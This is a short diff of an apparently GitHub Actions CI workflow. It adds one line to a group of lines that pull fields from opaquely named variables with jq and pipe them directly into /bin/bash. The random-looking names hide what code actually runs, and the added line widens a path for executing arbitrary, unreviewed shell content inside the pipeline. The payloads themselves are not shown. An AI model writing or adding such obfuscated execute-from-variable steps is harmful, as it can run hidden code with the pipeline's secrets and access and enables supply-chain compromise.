@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$eahd11" | jq -r .n54362 | /bin/bash
           printf '%s' "$tw99" | jq -r .pef30394 | /bin/bash
           echo $e4217 | jq -r .c04 | /bin/bash
+          echo $yo1 | jq -r .slvn5935 | /bin/bash
 
       - name: Store results
         if: always()
